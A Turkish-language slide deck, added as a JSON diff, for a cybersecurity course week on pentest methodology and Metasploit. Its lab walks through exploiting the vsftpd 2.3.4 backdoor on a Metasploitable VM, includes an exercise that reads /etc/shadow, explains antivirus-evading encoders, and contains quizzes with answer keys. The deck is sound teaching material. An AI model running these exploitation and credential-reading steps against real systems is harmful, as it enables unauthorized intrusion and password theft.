@@ -1,0 +1,290 @@
+[
+  {
+    "baslik": "Siber Güvenlik: Hafta 9",
+    "altbaslik": "Sızma Testleri (Pentest) Metodolojisi ve Metasploit Framework",
+    "icerik": "Program: Bilişim Güvenliği Teknolojisi\nModül: Sızma Testi ve Sömürü (Exploitation)\nHaftalık Odak: Pentest Metodolojileri, Kutu Testleri, Metasploit Mimarisi ve vsftpd Exploit\nHedef: Güvenlik açıklarını tespit edip Metasploit ile yetkili erişim sağlamak.",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit framework penetration testing ethical hacking terminal"
+    }
+  },
+  {
+    "baslik": "Neden Bu Konuyu Öğreniyoruz?",
+    "altbaslik": "Sektörel Bağlam: Saldırgandan Önce Açığı Bulmak",
+    "icerik": "Bir sistemin güvenli olduğunu iddia etmek yetmez; sızma testi ile kanıtlamak gerekir.\n- Siyah şapkalı saldırganlar sızmadan önce Beyaz Şapkalı uzmanlar sistemi test eder.\n- Metasploit Framework, dünyadaki tüm siber güvenlik uzmanlarının standart aracıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "penetration tester ethical hacker testing servers"
+    }
+  },
+  {
+    "baslik": "Haftanın Öğrenme Kazanımları",
+    "altbaslik": "Bu Dersin Sonunda Neler Kazanacaksınız?",
+    "icerik": "1. Sızma Testi (Pentest) metodolojilerini (PTES, NIST) açıklar.\n2. Siyah, Beyaz ve Gri Kutu testlerinin kapsamını ve farklarını kavrar.\n3. Metasploit Framework modül türlerini (Exploit, Payload, Auxiliary) tanımlar.\n4. msfconsole komut satırında arama, yapılandırma ve çalıştırma yapar.\n5. Hedef zafiyetli makinedeki vsftpd backdoor açığını sömürüp root kabuğu alır.",
+    "gorsel": {
+      "type": "image",
+      "query": "learning objectives penetration testing checklist"
+    }
+  },
+  {
+    "baslik": "Sızma Testi (Penetration Test) Nedir?",
+    "altbaslik": "Yasal ve İzinli Güvenlik Denetimi",
+    "icerik": "Pentest: Kurumun yazılı izni ve sözleşmesi dahilinde, bir saldırgan gibi sistemdeki açıkları arama, sömürme (exploit) ve raporlama sürecidir.\nZafiyet Taramasından Farkı:\n- Zafiyet taraması sadece 'Burada açık olabilir' der (Teori).\n- Sızma testi o açığı bizzat istismar edip sisteme girerek kanıtlar (Pratik PoC).",
+    "gorsel": {
+      "type": "image",
+      "query": "penetration test vs vulnerability scan diagram comparison"
+    }
+  },
+  {
+    "baslik": "Kutu Testi Metodolojileri",
+    "altbaslik": "Black Box, White Box ve Grey Box",
+    "icerik": "1. Siyah Kutu (Black Box): Uzmana HİÇBİR BİLGİ verilmez. Dışarıdaki bilgisiz saldırganı simüle eder.\n2. Beyaz Kutu (White Box): Uzmana TÜM BİLGİLER (Kaynak kodlar, IP şeması, şifreler) verilir. En derinlemesine testtir.\n3. Gri Kutu (Grey Box): Uzmana SINIRLI BİLGİ verilir (Örn: Standart personel kullanıcı adı/şifresi).",
+    "gorsel": {
+      "type": "image",
+      "query": "black box white box grey box testing methodology diagram"
+    }
+  },
+  {
+    "baslik": "Sızma Testi Aşamaları (PTES Standardı)",
+    "altbaslik": "7 Adımlı Profesyonel Süreç",
+    "icerik": "1. Kapsam Belirleme (Pre-engagement)\n2. İstihbarat Toplama (Intelligence Gathering)\n3. Tehdit Modelleme (Threat Modeling)\n4. Zafiyet Analizi (Vulnerability Analysis)\n5. Sömürü (Exploitation)\n6. Sömürü Sonrası (Post-Exploitation)\n7. Raporlama (Reporting)",
+    "gorsel": {
+      "type": "image",
+      "query": "ptes penetration testing execution standard 7 stages"
+    }
+  },
+  {
+    "baslik": "Metasploit Framework Nedir?",
+    "altbaslik": "Dünyanın En Güçlü İstismar Çerçevesi",
+    "icerik": "Rapid7 tarafından geliştirilen, açık kaynaklı ve modüler sızma testi platformudur.\nBünyesinde:\n- 2400'den fazla hazır Exploit modülü\n- 1200'den fazla Auxiliary (yardımcı tarayıcı)\n- 600'den fazla Payload barındırır.",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit framework rapid7 logo matrix background"
+    }
+  },
+  {
+    "baslik": "Metasploit Modül Türleri",
+    "altbaslik": "Exploit, Payload ve Auxiliary",
+    "icerik": "- Exploit: Güvenlik açığını tetikleyip kapıyı açan saldırı kodudur.\n- Payload: Açılan kapıdan içeri sokulan ve komut çalıştırmamızı sağlayan zararlı yüktür (Reverse Shell, Meterpreter).\n- Auxiliary: Port tarama, servis sürümü bulma ve keşif yapan yardımcı araçlardır.\n- Post: Sisteme sızdıktan sonra yetki yükseltme ve şifre çekme modülleridir.",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit module architecture exploit payload auxiliary"
+    }
+  },
+  {
+    "baslik": "Temel msfconsole Komutları",
+    "altbaslik": "Konsolda Gezinme Sözdizimi",
+    "icerik": "- msfconsole : Konsolu başlatır.\n- search <kelime> : Exploit veya modül arar (Örn: search vsftpd).\n- use <modül_yolu> : İlgili modülü aktif eder.\n- show options : Doldurulması gereken zorunlu ayarları listeler.\n- set RHOSTS <IP> : Hedef sunucunun IP adresini ayarlar (Remote Host).\n- set LHOST <IP> : Kendi Kali IP adresinizi ayarlar (Local Host).\n- exploit veya run : Saldırıyı başlatır!",
+    "gorsel": {
+      "type": "image",
+      "query": "msfconsole command line cheat sheet terminal"
+    }
+  },
+  {
+    "baslik": "vsftpd 2.3.4 Backdoor Zafiyeti",
+    "altbaslik": "Tarihi Bir Tedarik Zinciri Açığı",
+    "icerik": "2011 yılında vsftpd FTP sunucusunun resmi kaynak kodlarına hackerlar tarafından gizli bir arka kapı (Backdoor) yerleştirildi.\nÇalışma Mantığı:\nKullanıcı adı sonuna gülücük işareti (:) eklenirse (Örn: admin:))\nsunucu 6200 portunda otomatik olarak root yetkisinde bir kabuk (shell) açar!",
+    "gorsel": {
+      "type": "image",
+      "query": "vsftpd backdoor smiley face vulnerability code"
+    }
+  },
+  {
+    "baslik": "Uygulama Laboratuvarı: Metasploit ile Sızma",
+    "altbaslik": "Laboratuvar Hedeflerimiz",
+    "icerik": "Laboratuvarımızda:\n- Hedef Makine: 192.168.1.50 (Sunucu 2 üzerinde koşan Metasploitable VM)\n1. Metasploit veritabanını başlatacağız.\n2. vsftpd exploit modülünü seçeceğiz.\n3. RHOSTS parametresini ayarlayıp exploit edeceğiz ve root yetkisi alacağız!",
+    "gorsel": {
+      "type": "image",
+      "query": "students hacking target virtual machine computer lab"
+    }
+  },
+  {
+    "baslik": "Uygulama 1: Metasploit Başlatma",
+    "altbaslik": "msfconsole ve db_status",
+    "icerik": "Terminalde şu komutları çalıştırın:\nsudo msfdb init\nmsfconsole -q\nKonsol açıldığında veritabanı durumunu kontrol edin:\nmsf6 > db_status\nBeklenen Çıktı: [*] Connected to msf. Connection type: postgresql.",
+    "gorsel": {
+      "type": "image",
+      "query": "msfconsole banner terminal prompt start"
+    }
+  },
+  {
+    "baslik": "Uygulama 2: Exploit Modülünü Arama ve Seçme",
+    "altbaslik": "search ve use Komutları",
+    "icerik": "Konsolda vsftpd modülünü arayalım:\nmsf6 > search vsftpd\nModülü seçelim:\nmsf6 > use exploit/unix/ftp/vsftpd_234_backdoor\nSeçildikten sonra konsol istemcisi kırmızıya döner:\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) >",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit search use exploit terminal output"
+    }
+  },
+  {
+    "baslik": "Uygulama 3: Hedef IP Belirleme ve Ayarlar",
+    "altbaslik": "show options ve set RHOSTS",
+    "icerik": "Zorunlu ayarları görelim:\nmsf6 exploit(...) > show options\nHedef makinenin IP adresini tanımlayalım:\nmsf6 exploit(...) > set RHOSTS 192.168.1.50\nAyarların doğru girildiğini 'show options' ile teyit edin.",
+    "gorsel": {
+      "type": "image",
+      "query": "msfconsole show options set rhosts terminal"
+    }
+  },
+  {
+    "baslik": "Uygulama 4: Sömürüyü Çalıştırma (Exploit!)",
+    "altbaslik": "Sistemi Ele Geçirme",
+    "icerik": "Saldırıyı başlatalım:\nmsf6 exploit(...) > exploit\nBeklenen Başarı Çıktısı:\n[+] 192.168.1.50:21 - Backdoor service spawned, sending payload...\n[*] Found shell.\n[*] Command shell session 1 opened!\nSistemin içine girdiniz!",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit exploit success session opened terminal"
+    }
+  },
+  {
+    "baslik": "Uygulama 5: Ele Geçirilen Sistemde Komut Koşturma",
+    "altbaslik": "whoami ve Sistem Bilgisi",
+    "icerik": "Açılan kabuk satırında şunları yazın:\nwhoami\nid\nuname -a\nSonuç:\nwhoami komutuna 'root' yanıtını aldınız!\nHedef Linux sunucunun en yetkili yöneticisisiniz.",
+    "gorsel": {
+      "type": "image",
+      "query": "root shell whoami output terminal success"
+    }
+  },
+  {
+    "baslik": "Sık Yapılan Hatalar ve İpuçları",
+    "altbaslik": "Metasploit Kullanımında Dikkat Edilecekler",
+    "icerik": "1. 'Exploit completed, but no session created': RHOSTS yanlış yazılmış olabilir veya hedef makinedeki 6200 portu o an başka öğrenci tarafından meşguldür.\n2. RHOSTS vs LHOST: RHOSTS (Remote Host) kurbanın IP'sidir, LHOST (Local Host) kendi Kali IP'nizdir.\n3. Konsoldan Çıkış: back komutu önceki menüye döner, exit konsolu kapatır.",
+    "gorsel": {
+      "type": "image",
+      "query": "troubleshooting metasploit errors checklist warning"
+    }
+  },
+  {
+    "baslik": "Sektörel Vaka: EternalBlue (WannaCry) Krizi",
+    "altbaslik": "MS17-010 Zafiyeti",
+    "icerik": "Vaka: NSA'dan sızdırılan EternalBlue açığı Metasploit'e modül olarak eklendi.\nİstismar: Saldırganlar bu modülü WannaCry fidye yazılımına entegre etti ve dünya çapında 200.000 Windows bilgisayarı dakikalar içinde kilitledi.\nDers: Kritik açıkların Metasploit modülü yayınlandığı anda tüm dünya tehdit altına girer; acil yama şarttır.",
+    "gorsel": {
+      "type": "image",
+      "query": "wannacry ransomware locked screen hospital computers"
+    }
+  },
+  {
+    "baslik": "Vaka Analizi: Pentest Raporlama Standartları",
+    "altbaslik": "Yöneticiye Ne Sunulur?",
+    "icerik": "Sızma testi bittiğinde müşteriye sunulan raporun ana başlıkları:\n1. Yönetici Özeti (Executive Summary): Teknik olmayan üst yöneticiye risk seviyesi (Kritik/Yüksek).\n2. Zafiyet Kanıtı (PoC - Proof of Concept): Alınan root ekran görüntüleri.\n3. İyileştirme ve Kapatma Önerileri (Remediation).",
+    "gorsel": {
+      "type": "image",
+      "query": "penetration test report document executive summary"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 1",
+    "altbaslik": "Kutu Testleri",
+    "icerik": "Soru: Sızma testi uzmanına hedef sistem hakkında hiçbir bilgi verilmeyen test türüne ne ad verilir?\nA) Beyaz Kutu (White Box)\nB) Siyah Kutu (Black Box)\nC) Gri Kutu (Grey Box)\nD) Şeffaf Kutu\n\nDoğru Cevap: B (Siyah Kutu / Black Box)",
+    "gorsel": {
+      "type": "image",
+      "query": "quiz question multiple choice exam board"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 2",
+    "altbaslik": "Metasploit Kavramları",
+    "icerik": "Soru: Metasploit'te açığı tetikleyip kapıyı açan koda ne ad verilir?\nA) Payload\nB) Exploit\nC) Encoder\nD) NOP\n\nDoğru Cevap: B (Exploit)",
+    "gorsel": {
+      "type": "image",
+      "query": "exploit definition test question"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 3",
+    "altbaslik": "Metasploit Komutları",
+    "icerik": "Soru: Metasploit konsolunda hedef kurban makinenin IP adresini ayarlamak için hangi komut kullanılır?\nA) set LHOST\nB) set RHOSTS\nC) set TARGET\nD) set VICTIM\n\nDoğru Cevap: B (set RHOSTS)",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit command rhosts question multiple choice"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 4",
+    "altbaslik": "Payload Tanımı",
+    "icerik": "Soru: Sisteme sızıldıktan sonra kurban makinede çalışan ve komut çalıştırmayı sağlayan zararlı yüke ne ad verilir?\nA) Payload\nB) Scanner\nC) Firewall\nD) Ping\n\nDoğru Cevap: A (Payload)",
+    "gorsel": {
+      "type": "image",
+      "query": "payload definition question board"
+    }
+  },
+  {
+    "baslik": "Mini Quiz: Soru 5",
+    "altbaslik": "Metodoloji",
+    "icerik": "Soru: Dünyada sızma testleri için kabul görmüş 7 aşamalı profesyonel metodoloji standardı hangisidir?\nA) PTES\nB) ISO 9001\nC) IEEE 802.11\nD) W3C\n\nDoğru Cevap: A (PTES)",
+    "gorsel": {
+      "type": "image",
+      "query": "ptes standard question test"
+    }
+  },
+  {
+    "baslik": "Sınıf İçi Tartışma ve Uygulama",
+    "altbaslik": "Hedefte Dosya Arama",
+    "icerik": "Uygulama Görevi:\nRoot kabuğunu aldığınız hedef makinede:\ncat /etc/shadow komutunu çalıştırıp ekrandaki root parolasının hashini ilk gören öğrenci el kaldırsın!",
+    "gorsel": {
+      "type": "image",
+      "query": "students competition classroom coding linux challenge"
+    }
+  },
+  {
+    "baslik": "Zafiyet Veritabanları: CVE ve NVD",
+    "altbaslik": "Açıkların Küresel Kimlik Numarası",
+    "icerik": "CVE (Common Vulnerabilities and Exposures):\nDünyada keşfedilen her güvenlik açığına verilen benzersiz kimlik kodudur (Örn: CVE-2021-44228 Log4j).\n- NVD (National Vulnerability Database): Açığın CVSS puanını (1-10 arası risk derecesi) ve kapatma yöntemini yayınlar.\nPentesterlar Nmap'ten aldıkları sürümü CVE veritabanlarında aratır.",
+    "gorsel": {
+      "type": "image",
+      "query": "cve nvd vulnerability database score matrix"
+    }
+  },
+  {
+    "baslik": "Exploit-DB ve Searchsploit",
+    "altbaslik": "Açık Kaynak Exploit Arşivi",
+    "icerik": "Exploit-DB (Offensive Security):\nDünyadaki tüm çalışan exploit kodlarının toplandığı resmi arşivdir.\nSearchsploit:\nKali Linux'ta internet bağlantısı olmadan çevrimdışı exploit arayan komut satırı aracıdır.\nÖrnek:\nsearchsploit vsftpd 2.3.4",
+    "gorsel": {
+      "type": "image",
+      "query": "searchsploit exploit db terminal command line search"
+    }
+  },
+  {
+    "baslik": "Metasploit Encoder Modülleri",
+    "altbaslik": "Zararlı Kodu Antivirüsten Gizlemek",
+    "icerik": "Payload kodları açık metin baytlar içerirse antivirüsler tarafından imza tabanlı olarak anında yakalanır.\nEncoderlar (Örn: shikata_ga_nai):\nPayload'un baytlarını XOR işlemleriyle polimorfik olarak şifreler, böylece dosya imzası değişir ve basit antivirüsleri atlatır.",
+    "gorsel": {
+      "type": "image",
+      "query": "metasploit encoder shikata ga nai obfuscation diagram"
+    }
+  },
+  {
+    "baslik": "Çözümlü Vaka: Nmap'ten Exploit'e Geçiş",
+    "altbaslik": "Uçtan Uca Sızma Akışı",
+    "icerik": "Adım 1 (Nmap): sudo nmap -sV 192.168.1.50 -> vsftpd 2.3.4 bulundu.\nAdım 2 (Araştırma): searchsploit vsftpd 2.3.4 -> Backdoor bulundu.\nAdım 3 (Metasploit): use exploit/unix/ftp/vsftpd_234_backdoor\nAdım 4 (Yapılandırma): set RHOSTS 192.168.1.50\nAdım 5 (Sömürü): exploit -> root kabuğu alındı!",
+    "gorsel": {
+      "type": "image",
+      "query": "penetration testing workflow nmap to metasploit diagram"
+    }
+  },
+  {
+    "baslik": "Haftalık Konu Özeti",
+    "altbaslik": "Bu Hafta Neler Öğrendik?",
+    "icerik": "- Sızma testleri (Pentest) metodolojik ve yasal izinli güvenlik denetimleridir.\n- Kutu testleri (Black/White/Grey) farklı saldırgan profillerini simüle eder.\n- Metasploit Framework exploit ve payload mimarisiyle sömürüyü otomatikleştirir.\n- Elde edilen yetkiler mutlaka profesyonel bir raporla kuruma sunulmalıdır.",
+    "gorsel": {
+      "type": "image",
+      "query": "summary concept mind map review"
+    }
+  },
+  {
+    "baslik": "Gelecek Haftaya Bakış",
+    "altbaslik": "Hafta 10: İleri Sızma Testi ve Sömürü Sonrası (Meterpreter)",
+    "icerik": "Ön Hazırlık:\n- Meterpreter payload'u neden antivirüslere yakalanmaz?\n- msfvenom ile özel Trojan ve ajan dosyaları nasıl üretilir?\n- Ele geçirilen hedefte yetki yükseltme ve iz silme (clearev) nasıl yapılır?",
+    "gorsel": {
+      "type": "image",
+      "query": "meterpreter post exploitation privilege escalation concept"
+    }
+  },
+  {
+    "baslik": "Çıkış Bileti (Exit Ticket)",
+    "altbaslik": "Dersi Bitirmeden Önce Cevaplayınız",
+    "icerik": "Günün Sorusu:\n'Metasploit'te Exploit ile Payload arasındaki farkı ve ilişkisini tek bir somut örnekle açıklayınız.'\n\nCevabınızı kâğıda yazıp teslim ediniz.",
+    "gorsel": {
+      "type": "image",
+      "query": "exit ticket paper feedback classroom student"
+    }
+  }
+]
